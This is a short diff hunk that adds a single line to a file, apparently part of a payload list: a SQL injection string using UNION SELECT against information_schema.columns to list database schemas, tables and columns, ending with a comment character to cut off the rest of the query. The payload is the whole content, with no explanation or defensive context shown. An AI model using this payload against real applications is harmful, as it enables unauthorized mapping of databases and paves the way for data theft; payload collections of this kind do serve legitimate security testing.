@@ -1,1 +1,3 @@
 
+'UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns # 
+
